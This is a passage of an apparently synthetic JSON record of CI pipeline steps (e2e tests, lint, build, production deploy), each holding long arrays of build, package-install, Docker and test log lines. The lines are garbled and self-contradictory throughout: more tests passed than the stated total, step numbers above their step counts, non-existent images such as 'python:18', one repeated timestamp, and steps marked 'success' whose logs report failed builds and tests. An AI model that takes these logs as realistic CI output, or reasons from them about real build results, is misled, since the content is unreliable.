          "Platform: win32-x64",
          "pip: Installing build dependencies...",
          "\u2717 build failed with exit code 121",
          "Artifact uploaded: dist.zip (28MB)",
          "Artifact uploaded: dist.zip (85MB)",
          "  PASS: test_user_create (215ms)",
          "Coverage: 73% statements, 68% branches",
          "Pulling image: node:latest",
          "Already up to date.",
          "Ran 189 tests in 41s",
          "Environment: development",
          "Ready.",
          "Time: 3.211s",
          "Test Suites: 23 passed, 46 total",
          "NODE_ENV=development",
          "Processing...",
          "Creating production build...",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Cache invalidated: node_modules",
          "npm install: resolved 1991 packages",
          "Finished.",
          "[12:46:59] INFO: Connecting to database",
          "Artifact downloaded: 47MB",
          "Building Docker image...",
          "[12:46:59] DEBUG: Connection pool: 12 active",
          "Artifact uploaded: build.tar.gz (13MB)",
          "[12:46:59] INFO: Connecting to database",
          "Compiling utils/handler.rs...",
          "pip: Installing build dependencies...",
          "WARNING: webpack has known vulnerabilities",
          "Installing react@1.11.8",
          "  PASS: test_user_create (316ms)",
          "\u2713 All checks passed",
          "Finished.",
          "pip install: Successfully installed jest-5.19",
          "HEAD is now at f767dcc",
          "Compiling src/handler.rs...",
          "Ran 175 tests in 48s",
          "Layer 2/14: ENV command",
          "npm install: added 496 packages",
          "[12:46:59] DEBUG: Loading configuration",
          "Transforming 786 files...",
          "pip install: Successfully installed eslint-5.17",
          "Cache hit for key-9537",
          "Cache saved successfully",
          "Pushing to registry...",
          "Tests: 368 passed, 202 total",
          "Snapshots: 16 passed, 35 total",
          "Image pulled successfully",
          "pip: Collecting prettier",
          "Artifact downloaded: 31MB",
          "\u2717 build failed with exit code 39",
          "[12:46:59] DEBUG: Loading configuration",
          "Step 13/21: Testing",
          "npm notice: package.json updated",
          "Snapshots: 48 passed, 46 total",
          "pip: Installing build dependencies...",
          "Compiling components/main.py...",
          "Time: 81.208s",
          "[12:46:59] INFO: Connecting to database",
          "[12:46:59] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (36MB)",
          "  PASS: unit/test_api_health.spec.js",
          "[12:46:59] INFO: Cache refreshed",
          "Test Suites: 47 passed, 17 total",
          "Cache restored successfully (122MB)",
          "Completed.",
          "\u2713 Step 'setup' succeeded",
          "POST /upload - 201 (62ms)",
          "Already up to date.",
          "Pushing to registry...",
          "[12:46:59] WARN: Deprecated API usage",
          "\u2713 build completed",
          "npm install: resolved 125 packages",
          "[12:46:59] INFO: Starting build process",
          "FAILED: test_db_connect",
          "Connection established",
          "FAILED: test_user_create",
          "Transforming 478 files...",
          "pip: Collecting axios",
          "[12:46:59] DEBUG: Query executed in 54ms",
          "pip install: Successfully installed webpack-1.17",
          "[12:46:59] DEBUG: Connection pool: 18 active",
          "Installing eslint@1.2.6",
          "Compiling utils/handler.rs...",
          "Image pulled successfully",
          "Coverage: 85% statements, 62% branches",
          "Test Suites: 19 passed, 11 total",
          "Snapshots: 6 passed, 29 total",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Done.",
          "[12:46:59] DEBUG: Connection pool: 11 active",
          "Building Docker image...",
          "Already up to date.",
          "Step 14/16: Deploying",
          "\u2717 build failed with exit code 107",
          "npm install: added 216 packages",
          "Artifact uploaded: dist.zip (91MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/handler.rs...",
          "npm install: resolved 445 packages",
          "Cache restored successfully (306MB)",
          "[12:46:59] DEBUG: Memory usage: 1054MB",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "npm notice: package.json updated",
          "Fetching from https://docker.io/package.json",
          "[12:46:59] INFO: Starting build process",
          "Verifying...",
          "Artifact downloaded: 22MB",
          "Generating source maps...",
          "[12:46:59] INFO: Connecting to database",
          "pip: Downloading axios-1.7.tar.gz",
          "Step 10/24: Building",
          "WARNING: jest has known vulnerabilities",
          "Test Suites: 50 passed, 43 total",
          "HEAD is now at 277daaa",
          "Fetching from https://github.com/package.json",
          "[12:46:59] DEBUG: Connection pool: 18 active",
          "Switched to branch 'bugfix/task-657'",
          "Step 12/19: Deploying",
          "Step 12/16: Testing",
          "[12:46:59] DEBUG: Loading configuration",
          "Step 4/21: Running migrations",
          "Pushing to registry...",
          "Connection established",
          "Compiling utils/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Bundling styles.css",
          "\u2713 All checks passed",
          "[12:46:59] WARN: Deprecated API usage",
          "Installing webpack@4.13.5",
          "  PASS: integration/test_user_create.spec.js",
          "Cache restored successfully (16MB)",
          "NODE_ENV=test",
          "[12:46:59] ERROR: Connection failed",
          "Generating source maps...",
          "Pulling image: python:3.11",
          "Waiting...",
          "Ran 131 tests in 33s",
          "[12:46:59] DEBUG: Loading configuration",
          "Ready.",
          "\u2713 Step 'install' succeeded",
          "Snapshots: 39 passed, 6 total",
          "Ran 158 tests in 50s",
          "Fetching from https://googleapis.com/package.json",
          "WARNING: lodash has known vulnerabilities",
          "Step 8/16: Building",
          "Ready.",
          "\u2713 All checks passed",
          "Cache restored successfully (479MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "NODE_ENV=production",
          "POST /api - 200 (20ms)",
          "[12:46:59] DEBUG: Initializing service",
          "[12:46:59] DEBUG: Initializing service",
          "Generating source maps...",
          "Environment: test",
          "Cache restored successfully (199MB)",
          "Connection established",
          "\u2713 All checks passed",
          "Creating production build...",
          "Pulling image: python:18",
          "Platform: linux-x64",
          "pip install: Successfully installed axios-5.3",
          "HEAD is now at 1b4bf1f",
          "[12:46:59] DEBUG: Loading configuration",
          "Using Python 3.9",
          "Uploading artifact 'build' (33 files)",
          "Ran 171 tests in 20s",
          "Minifying vendor.js",
          "Creating production build...",
          "TLS handshake completed",
          "[12:46:59] DEBUG: Memory usage: 719MB",
          "[12:46:59] WARN: Deprecated API usage",
          "Compiling components/utils.go...",
          "[12:46:59] DEBUG: Connection pool: 6 active",
          "[12:46:59] WARN: Deprecated API usage",
          "Loading...",
          "Step 11/19: Deploying",
          "Tests: 298 passed, 226 total",
          "Ran 48 tests in 26s",
          "Step 11/20: Testing",
          "Fetching submodules...",
          "Step 11/16: Linting",
          "Minifying main.js",
          "Fetching from https://gcr.io/package.json",
          "Step 6/16: Testing",
          "Test Suites: 31 passed, 37 total",
          "Compiling lib/handler.rs...",
          "NODE_ENV=development",
          "  PASS: integration/test_cache_hit.spec.js",
          "Step 20/22: Running migrations",
          "Tests: 497 passed, 280 total",
          "Using Node.js 18.4.8",
          "Fetching from https://googleapis.com/package.json",
          "Step 13/20: Testing",
          "TLS handshake completed",
          "[12:46:59] DEBUG: Query executed in 45ms",
          "[12:46:59] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:59] WARN: Deprecated API usage",
          "Ready.",
          "Bundling styles.js",
          "Loading...",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 deploy completed",
          "Waiting...",
          "Cache hit for key-8134",
          "Compiling utils/handler.rs...",
          "Layer 5/12: COPY command",
          "[12:46:59] DEBUG: Query executed in 100ms",
          "pip install: Successfully installed jest-1.13",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-02T12:48:38.195119",
        "finished_at": "2025-12-02T12:48:53.116920",
        "log_lines": [
          "=== Step: lint ===",
          "Already up to date.",
          "pip install: Successfully installed jest-1.18",
          "npm install: resolved 1891 packages",
          "Generating source maps...",
          "Checking out main branch",
          "Fetching submodules...",
          "Cache saved successfully",
          "Success!",
          "HEAD is now at 4d2e497",
          "Time: 69.794s",
          "Time: 42.909s",
          "Artifact uploaded: build.tar.gz (1MB)",
          "[12:46:59] DEBUG: Connection pool: 15 active",
          "Uploading artifact 'build' (19 files)",
          "Step 17/20: Installing dependencies",
          "NODE_ENV=production",
          "[12:46:59] WARN: Deprecated API usage",
          "Ran 43 tests in 42s",
          "\u2713 Step 'test' succeeded",
          "[12:46:59] DEBUG: Connection pool: 19 active",
          "HEAD is now at 03bd0b2",
          "Fetching submodules...",
          "[12:46:59] INFO: Request completed",
          "Step 3/18: Building",
          "Done.",
          "Using Python 3.9",
          "Compiling src/index.js...",
          "[12:46:59] DEBUG: Initializing service",
          "GET /api - 200 (22ms)",
          "  PASS: test_api_health (488ms)",
          "Tests: 423 passed, 263 total",
          "Compiling utils/app.ts...",
          "Tests: 360 passed, 368 total",
          "Generating source maps...",
          "Cache invalidated: node_modules",
          "WARNING: eslint has known vulnerabilities",
          "Compiling utils/utils.go...",
          "Compiling lib/service.java...",
          "[12:46:59] DEBUG: Query executed in 70ms",
          "[12:46:59] DEBUG: Initializing service",
          "\u2717 build failed with exit code 7",
          "[12:46:59] DEBUG: Memory usage: 1864MB",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Creating production build...",
          "  PASS: integration/test_user_create.spec.js",
          "Artifact uploaded: dist.zip (37MB)",
          "Pulling image: node:3.11",
          "GET /status - 200 (8ms)",
          "Cache hit for key-8758",
          "Step 5/22: Deploying",
          "Snapshots: 38 passed, 24 total",
          "FAILED: test_db_connect",
          "pip: Collecting prettier",
          "Fetching submodules...",
          "\u2717 build failed with exit code 52",
          "Ran 28 tests in 22s",
          "OK",
          "yarn add: Done in 10.48s",
          "npm notice: created a lockfile",
          "Uploading artifact 'dist' (22 files)",
          "Layer 3/12: COPY command",
          "  PASS: unit/test_cache_hit.spec.js",
          "\u2713 All checks passed",
          "[12:46:59] WARN: Deprecated API usage",
          "Finished.",
          "Ran 37 tests in 13s",
          "Compiling components/index.js...",
          "Test Suites: 15 passed, 18 total",
          "Cache restored successfully (492MB)",
          "Step 17/25: Testing",
          "[12:46:59] WARN: Deprecated API usage",
          "Cache saved successfully",
          "[12:46:59] INFO: Request completed",
          "Image pulled successfully",
          "Snapshots: 38 passed, 45 total",
          "Ran 139 tests in 41s",
          "HEAD is now at c476bbb",
          "Uploading artifact 'coverage' (19 files)",
          "HEAD is now at 7d9eb2e",
          "FAILED: test_user_create",
          "Processing...",
          "WARNING: jest has known vulnerabilities",
          "Time: 19.409s",
          "FAILED: test_db_connect",
          "Generating source maps...",
          "Checking out main branch",
          "Checking out master branch",
          "Cache saved successfully",
          "Bundling runtime.js",
          "Optimizing 33 modules...",
          "Cache invalidated: node_modules",
          "[12:46:59] WARN: Deprecated API usage",
          "Test Suites: 48 passed, 11 total",
          "[12:46:59] DEBUG: Connection pool: 2 active",
          "[12:46:59] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Coverage: 100% statements, 92% branches",
          "GET /api - 201 (85ms)",
          "Connection established",
          "Transforming 731 files...",
          "Transforming 312 files...",
          "[12:46:59] WARN: Deprecated API usage",
          "yarn add: Done in 17.2s",
          "[12:46:59] INFO: Cache refreshed",
          "WARNING: prettier has known vulnerabilities",
          "Time: 105.759s",
          "HEAD is now at ba5f3d5",
          "WARNING: react has known vulnerabilities",
          "[12:46:59] INFO: Connecting to database",
          "Image pulled successfully",
          "Cache invalidated: dependencies",
          "yarn add: Done in 17.22s",
          "pip: Downloading axios-3.7.tar.gz",
          "Finished.",
          "Test Suites: 28 passed, 20 total",
          "Bundling main.css",
          "FAILED: test_user_create",
          "\u2713 Task completed in 3831ms",
          "Artifact downloaded: 44MB",
          "Tests: 443 passed, 236 total",
          "Environment: development",
          "Compiling lib/handler.rs...",
          "[12:46:59] DEBUG: Query executed in 28ms",
          "pip: Collecting jest",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Building Docker image...",
          "Done.",
          "Minifying main.js",
          "Transforming 442 files...",
          "Artifact uploaded: build.tar.gz (21MB)",
          "pip: Downloading eslint-3.16.tar.gz",
          "[12:46:59] INFO: Connecting to database",
          "Compiling src/utils.go...",
          "npm install: added 209 packages",
          "Fetching submodules...",
          "[12:46:59] DEBUG: Loading configuration",
          "Loading...",
          "  PASS: integration/test_api_health.spec.js",
          "Compiling lib/app.ts...",
          "Fetching submodules...",
          "HEAD is now at 71e0a23",
          "WARNING: express has known vulnerabilities",
          "Artifact downloaded: 22MB",
          "Finished.",
          "Fetching submodules...",
          "Transforming 446 files...",
          "[12:46:59] ERROR: Connection failed",
          "npm notice: created a lockfile",
          "Time: 41.778s",
          "[12:46:59] DEBUG: Connection pool: 19 active",
          "[12:46:59] WARN: Deprecated API usage",
          "Cache invalidated: node_modules",
          "Loading...",
          "Already up to date.",
          "Step 7/17: Linting",
          "Pushing to registry...",
          "Switched to branch 'hotfix/task-134'",
          "[12:46:59] DEBUG: Connection pool: 18 active",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm install: resolved 1531 packages",
          "Step 13/24: Deploying",
          "Compiling src/main.py...",
          "Processing...",
          "npm install: added 122 packages",
          "\u2717 build failed with exit code 92",
          "Verifying...",
          "Optimizing 70 modules...",
          "Coverage: 91% statements, 69% branches",
          "Installing express@2.16.8",
          "[12:46:59] WARN: Deprecated API usage",
          "Snapshots: 9 passed, 27 total",
          "WARNING: lodash has known vulnerabilities",
          "Pushing to registry...",
          "WARNING: react has known vulnerabilities",
          "Pulling image: node:latest",
          "Already up to date.",
          "Pushing to registry...",
          "Fetching submodules...",
          "Completed.",
          "Time: 29.943s",
          "pip install: Successfully installed jest-2.18",
          "Step 5/15: Building",
          "npm install: added 91 packages",
          "[12:46:59] WARN: Deprecated API usage",
          "Step 19/22: Testing",
          "FAILED: test_db_connect",
          "Finished.",
          "Step 6/17: Running migrations",
          "npm notice: created a lockfile",
          "Pushing to registry...",
          "Installing express@4.16.4",
          "NODE_ENV=test",
          "Step 11/21: Building",
          "Step 10/17: Linting",
          "Coverage: 83% statements, 70% branches",
          "Minifying vendor.js",
          "Cache miss for key-8163",
          "Test Suites: 7 passed, 50 total",
          "[12:46:59] INFO: Connecting to database",
          "Compiling utils/app.ts...",
          "Verifying...",
          "\u2717 build failed with exit code 11",
          "Step 17/21: Running migrations",
          "Switched to branch 'feature/task-962'",
          "[12:46:59] DEBUG: Initializing service",
          "Compiling src/service.java...",
          "Optimizing 79 modules...",
          "Compiling components/main.py...",
          "OK",
          "pip install: Successfully installed express-5.17",
          "[12:46:59] INFO: Processing request",
          "Time: 47.502s",
          "Waiting...",
          "Ready.",
          "\u2717 build failed with exit code 37",
          "WARNING: lodash has known vulnerabilities",
          "Minifying vendor.js",
          "[12:46:59] INFO: Connecting to database",
          "[12:46:59] DEBUG: Loading configuration",
          "Ran 76 tests in 56s",
          "Artifact downloaded: 11MB",
          "yarn add: Done in 5.57s",
          "Step 14/25: Installing dependencies",
          "OK",
          "Fetching submodules...",
          "[12:46:59] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "Installing react@3.7.4",
          "Completed.",
          "Artifact uploaded: dist.zip (84MB)",
          "Time: 108.803s",
          "pip: Installing build dependencies...",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-02T12:48:53.116920",
        "finished_at": "2025-12-02T12:49:37.882323",
        "log_lines": [
          "=== Step: build ===",
          "Waiting...",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Transforming 382 files...",
          "Ran 60 tests in 7s",
          "TLS handshake completed",
          "NODE_ENV=production",
          "Connection established",
          "Compiling src/utils.go...",
          "Ready.",
          "Fetching from https://npmjs.org/package.json",
          "Creating production build...",
          "Waiting...",
          "pip: Collecting react",
          "npm install: resolved 407 packages",
          "npm install: resolved 1623 packages",
          "Success!",
          "Switched to branch 'hotfix/task-716'",
          "yarn add: Done in 26.50s",
          "Processing...",
          "Layer 6/10: ENV command",
          "Cache invalidated: build",
          "Ran 142 tests in 59s",
          "Loading...",
          "NODE_ENV=test",
          "Step 6/19: Deploying",
          "Step 7/15: Running migrations",
          "[12:46:59] DEBUG: Initializing service",
          "Time: 10.982s",
          "Test Suites: 23 passed, 39 total",
          "Compiling lib/index.js...",
          "Cache invalidated: node_modules",
          "Minifying app.js",
          "Done.",
          "Transforming 637 files...",
          "Environment: development",
          "[12:46:59] INFO: Starting build process",
          "[12:46:59] WARN: Deprecated API usage",
          "Compiling utils/utils.go...",
          "Optimizing 67 modules...",
          "Exception: ValueError",
          "Minifying app.js",
          "Cache miss for key-2050",
          "Artifact uploaded: build.tar.gz (5MB)",
          "FAILED: test_user_create",
          "WARNING: eslint has known vulnerabilities",
          "\u2717 build failed with exit code 28",
          "[12:46:59] INFO: Starting build process",
          "Coverage: 87% statements, 82% branches",
          "Cache saved successfully",
          "[12:46:59] INFO: Cache refreshed",
          "\u2717 build failed with exit code 28",
          "Cache saved successfully",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Ran 15 tests in 39s",
          "[12:46:59] INFO: Connecting to database",
          "Checking out main branch",
          "[12:46:59] WARN: Deprecated API usage",
          "Loading...",
          "Step 19/20: Running migrations",
          "Waiting...",
          "Compiling src/utils.go...",
          "Checking out master branch",
          "Switched to branch 'hotfix/task-606'",
          "Step 3/15: Building",
          "npm install: added 387 packages",
          "Fetching from https://github.com/package.json",
          "Transforming 268 files...",
          "Step 4/15: Deploying",
          "\u2713 All checks passed",
          "\u2713 Task completed in 743ms",
          "Completed.",
          "[12:46:59] INFO: Processing request",
          "Done.",
          "Minifying app.js",
          "HEAD is now at 854dc64",
          "\u2713 test completed",
          "FAILED: test_db_connect",
          "POST /data - 202 (310ms)",
          "Verifying...",
          "WARNING: prettier has known vulnerabilities",
          "npm notice: created a lockfile",
          "pip: Collecting jest",
          "GET /health - 204 (97ms)",
          "Using Python 3.12",
          "Cache saved successfully",
          "pip install: Successfully installed lodash-4.0",
          "Coverage: 99% statements, 70% branches",
          "Compiling components/index.js...",
          "Image pulled successfully",
          "npm install: resolved 1931 packages",
          "Waiting...",
          "npm notice: created a lockfile",
          "OK",
          "\u2713 test completed",
          "[12:46:59] INFO: Processing request",
          "\u2713 validate completed",
          "  PASS: test_cache_hit (100ms)",
          "Minifying app.js",
          "Ready.",
          "\u2717 build failed with exit code 43",
          "Cache restored successfully (144MB)",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Artifact downloaded: 20MB",
          "Step 1/24: Deploying",
          "Waiting...",
          "WARNING: lodash has known vulnerabilities",
          "npm notice: created a lockfile",
          "[12:46:59] WARN: Deprecated API usage",
          "Processing...",
          "Waiting...",
          "Platform: win32-x64",
          "WARNING: lodash has known vulnerabilities",
          "Uploading artifact 'dist' (11 files)",
          "Cache hit for key-5981",
          "Ran 18 tests in 33s",
          "\u2713 Step 'setup' succeeded",
          "Using Node.js 15.3.10",
          "NODE_ENV=test",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Finished.",
          "Uploading artifact 'dist' (4 files)",
          "Step 8/25: Building",
          "Compiling src/index.js...",
          "Transforming 183 files...",
          "WARNING: jest has known vulnerabilities",
          "\u2713 Task completed in 1218ms",
          "Finished.",
          "[12:46:59] DEBUG: Loading configuration",
          "pip install: Successfully installed eslint-1.2",
          "Checking out develop branch",
          "\u2713 deploy completed",
          "[12:46:59] DEBUG: Loading configuration",
          "Cache hit for key-3719",
          "Verifying...",
          "[12:46:59] DEBUG: Initializing service",
          "Loading...",
          "FAILED: test_user_create",
          "GET /api - 201 (28ms)",
          "Waiting...",
          "Compiling utils/service.java...",
          "Creating production build...",
          "\u2713 Task completed in 2566ms",
          "Step 3/19: Installing dependencies",
          "\u2713 Step 'install' succeeded",
          "[12:46:59] DEBUG: Initializing service",
          "Image pulled successfully",
          "Bundling runtime.js",
          "Generating source maps...",
          "WARNING: prettier has known vulnerabilities",
          "[12:46:59] INFO: Processing request",
          "Verifying...",
          "Ran 48 tests in 24s",
          "Creating production build...",
          "npm notice: created a lockfile",
          "Layer 10/14: RUN command",
          "NODE_ENV=test",
          "Cache invalidated: node_modules",
          "Artifact uploaded: dist.zip (87MB)",
          "[12:46:59] DEBUG: Loading configuration",
          "\u2713 Task completed in 627ms",
          "Connection established",
          "Snapshots: 42 passed, 36 total",
          "Platform: linux-x64",
          "Snapshots: 32 passed, 1 total",
          "[12:46:59] DEBUG: Initializing service",
          "yarn add: Done in 10.10s",
          "\u2713 Task completed in 3747ms",
          "[12:46:59] INFO: Cache refreshed",
          "pip install: Successfully installed jest-2.19",
          "npm install: added 366 packages",
          "Connection established",
          "[12:46:59] DEBUG: Connection pool: 12 active",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Cache invalidated: node_modules",
          "Step 4/24: Installing dependencies",
          "Step 2/16: Running migrations",
          "Compiling src/main.py...",
          "npm install: resolved 111 packages",
          "npm install: added 282 packages",
          "Step 14/24: Linting",
          "\u2713 Step 'setup' succeeded",
          "[12:46:59] INFO: Starting build process",
          "WARNING: prettier has known vulnerabilities",
          "[12:46:59] DEBUG: Query executed in 73ms",
          "Step 6/15: Deploying",
          "Waiting...",
          "Image pulled successfully",
          "Processing...",
          "Step 15/22: Running migrations",
          "Step 10/19: Installing dependencies",
          "\u2713 Step 'install' succeeded",
          "Using Python 3.9",
          "[12:46:59] DEBUG: Connection pool: 12 active",
          "npm notice: created a lockfile",
          "Loading...",
          "Pulling image: alpine:18",
          "Platform: win32-x64",
          "Artifact uploaded: dist.zip (13MB)",
          "Cache hit for key-1060",
          "  PASS: unit/test_api_health.spec.js",
          "Success!",
          "Platform: linux-x64",
          "[12:46:59] WARN: Deprecated API usage",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Waiting...",
          "Tests: 242 passed, 150 total",
          "Time: 84.84s",
          "Bundling main.css",
          "Cache miss for key-6845",
          "[12:46:59] INFO: Request completed",
          "[12:46:59] ERROR: Connection failed",
          "GET /api - 200 (35ms)",
          "  PASS: test_api_health (266ms)",
          "Artifact uploaded: dist.zip (34MB)",
          "Cache saved successfully",
          "\u2713 Task completed in 4955ms",
          "Time: 7.936s",
          "Checking out master branch",
          "Image pulled successfully",
          "pip install: Successfully installed webpack-5.20",
          "POST /api - 202 (383ms)",
          "  PASS: test_cache_hit (143ms)",
          "Using Python 3.9",
          "\u2713 Step 'install' succeeded",
          "WARNING: jest has known vulnerabilities",
          "Processing...",
          "Minifying app.js",
          "Uploading artifact 'dist' (26 files)",
          "\u2717 build failed with exit code 115",
          "Loading...",
          "[12:46:59] WARN: Deprecated API usage",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-02T12:49:37.882323",
        "finished_at": "2025-12-02T12:49:43.851043",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Compiling src/utils.go...",
          "WARNING: prettier has known vulnerabilities",
          "[12:46:59] DEBUG: Loading configuration",
          "Step 7/24: Linting",
          "[12:46:59] WARN: Deprecated API usage",
          "[12:46:59] DEBUG: Initializing service",
          "Compiling src/handler.rs...",
          "Success!",
          "Compiling utils/index.js...",
          "Step 7/23: Deploying",
          "Verifying...",
          "Fetching from https://pypi.org/package.json",
          "[12:46:59] INFO: Cache refreshed",
          "Transforming 509 files...",
          "pip install: Successfully installed webpack-5.20",
          "Step 1/25: Running migrations",
          "Using Node.js 15.11.3",
          "[12:46:59] WARN: Deprecated API usage",
          "  PASS: unit/test_db_connect.spec.js",
          "Cache hit for key-3159",
          "Platform: darwin-arm64",
          "pip: Downloading eslint-4.3.tar.gz",
          "[12:46:59] DEBUG: Connection pool: 6 active",
          "\u2713 Step 'build' succeeded",
          "\u2713 Task completed in 741ms",
          "Switched to branch 'hotfix/task-445'",
          "Step 10/24: Deploying",
          "Optimizing 42 modules...",
          "Bundling styles.css",
          "WARNING: eslint has known vulnerabilities",
          "Using Node.js 20.6.7",
          "Minifying app.js",
          "yarn add: Done in 17.14s",
          "[12:46:59] DEBUG: Loading configuration",
          "Artifact uploaded: dist.zip (23MB)",
          "[12:46:59] DEBUG: Loading configuration",
          "[12:46:59] WARN: Deprecated API usage",
          "Building Docker image...",
          "Loading...",
          "[12:46:59] INFO: Processing request",
          "npm notice: package.json updated",
          "Tests: 270 passed, 130 total",
          "npm install: added 433 packages",
          "Optimizing 23 modules...",
          "\u2713 Step 'checkout' succeeded",
          "Time: 62.361s",
          "Compiling src/main.py...",
          "Generating source maps...",
          "\u2713 All checks passed",
          "[12:46:59] INFO: Connecting to database",
          "Optimizing 19 modules...",
          "[12:46:59] INFO: Request completed",
          "Platform: win32-x64",
          "Minifying main.js",
          "Coverage: 83% statements, 74% branches",
          "Fetching from https://github.com/package.json",
          "[12:46:59] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "\u2717 build failed with exit code 72",
          "Cache restored successfully (115MB)",
          "Fetching submodules...",
          "Artifact uploaded: dist.zip (63MB)",
          "\u2713 All checks passed",
          "[12:46:59] INFO: Cache refreshed",
          "Generating source maps...",
          "pip install: Successfully installed react-2.9",
          "npm install: added 340 packages",
          "[12:46:59] ERROR: Connection failed",
          "pip install: Successfully installed webpack-5.19",
          "[12:46:59] INFO: Connecting to database",
          "Optimizing 89 modules...",
          "npm notice: created a lockfile",
          "Exception: TypeError",
          "Cache restored successfully (120MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Pulling image: alpine:18",
          "Coverage: 78% statements, 93% branches",
          "Cache saved successfully",
          "yarn add: Done in 25.14s",
          "Step 5/24: Building",
          "Step 19/18: Testing",
          "Processing...",
          "Image pulled successfully",
          "Platform: darwin-arm64",
          "WARNING: webpack has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Done.",
          "Compiling components/handler.rs...",
          "\u2713 build completed",
          "[12:46:59] DEBUG: Memory usage: 1721MB",
          "Minifying vendor.js",
          "Cache restored successfully (339MB)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Step 20/20: Deploying",
          "[12:46:59] ERROR: Connection failed",
          "GET /health - 200 (30ms)",
          "Step 9/22: Installing dependencies",
          "WARNING: lodash has known vulnerabilities",
          "pip: Downloading axios-2.20.tar.gz",
          "\u2713 Step 'test' succeeded",
          "[12:46:59] INFO: Starting build process",
          "[12:46:59] DEBUG: Query executed in 51ms",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Compiling src/handler.rs...",
          "npm install: resolved 1426 packages",
          "\u2713 validate completed",
          "Cache saved successfully",
          "Pulling image: alpine:latest",
          "Step 11/15: Installing dependencies",
          "Fetching submodules...",
          "Ready.",
          "npm install: resolved 1577 packages",
          "[12:46:59] DEBUG: Connection pool: 5 active",
          "[12:46:59] WARN: Deprecated API usage",
          "NODE_ENV=development",
          "Connection established",
          "OK",
          "Step 4/22: Running migrations",
          "Using Python 3.10",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:46:59] WARN: Deprecated API usage",
          "Pulling image: alpine:latest",
          "Step 16/21: Building",
          "Checking out develop branch",
          "Uploading artifact 'build' (1 files)",
          "Waiting...",
          "pip: Installing build dependencies...",
          "Installing axios@5.17.7",
          "Success!",
          "[12:46:59] DEBUG: Connection pool: 18 active",
          "Verifying...",
          "Fetching submodules...",
          "pip: Installing build dependencies...",
          "Step 6/17: Deploying",
          "[12:46:59] DEBUG: Connection pool: 16 active",
          "Uploading artifact 'dist' (22 files)",
          "Transforming 695 files...",
          "Ran 35 tests in 21s",
          "[12:46:59] DEBUG: Initializing service",
          "Artifact downloaded: 25MB",
          "Fetching submodules...",
          "npm notice: package.json updated",
          "Compiling utils/utils.go...",
          "Building Docker image...",
          "Waiting...",
          "Cache restored successfully (70MB)",
          "\u2713 Step 'test' succeeded",
          "Pushing to registry...",
          "pip: Collecting express",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 2/18: Linting",
          "Test Suites: 21 passed, 12 total",
          "[12:46:59] DEBUG: Loading configuration",
          "Cache invalidated: build",
          "npm notice: package.json updated",
          "Cache restored successfully (110MB)",
          "Cache hit for key-3097",
          "Waiting...",
          "Minifying vendor.js",
          "Ran 191 tests in 55s",
          "Minifying app.js",
          "[12:46:59] INFO: Request completed",
          "pip: Collecting jest",
          "Ran 130 tests in 1s",
          "[12:46:59] DEBUG: Initializing service",
          "Environment: test",
          "Compiling lib/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Generating source maps...",
          "Loading...",
          "\u2713 Step 'build' succeeded",
          "Fetching submodules...",
          "Using Python 3.9",
          "npm notice: package.json updated",
          "HEAD is now at 2b05f36",
          "Connection established",
          "Image pulled successfully",
          "Processing...",
          "Coverage: 87% statements, 96% branches",
          "\u2713 Task completed in 4125ms",
          "Using Python 3.12",
          "Transforming 137 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:59] INFO: Starting build process",
          "Fetching submodules...",
          "NODE_ENV=development",
          "[12:46:59] DEBUG: Query executed in 85ms",
          "Creating production build...",
          "Step 3/24: Deploying",
          "Platform: win32-x64",
          "Pushing to registry...",
          "npm notice: created a lockfile",
          "pip: Downloading react-1.16.tar.gz",
          "Fetching from https://googleapis.com/package.json",
          "Bundling runtime.js",
          "Step 20/17: Building",
          "Done.",
          "\u2717 build failed with exit code 61",
          "Transforming 617 files...",
          "WARNING: prettier has known vulnerabilities",
          "Building Docker image...",
          "Finished.",
          "[12:46:59] DEBUG: Initializing service",
          "Optimizing 89 modules...",
          "Cache restored successfully (404MB)",
          "yarn add: Done in 11.72s",
          "\u2713 Step 'setup' succeeded",
          "Completed.",
          "Compiling lib/utils.go...",
          "Layer 10/11: ENV command",
          "Ran 14 tests in 32s",
          "Snapshots: 11 passed, 12 total",
          "Platform: darwin-arm64",
          "[12:46:59] INFO: Cache refreshed",
          "[12:46:59] WARN: Deprecated API usage",
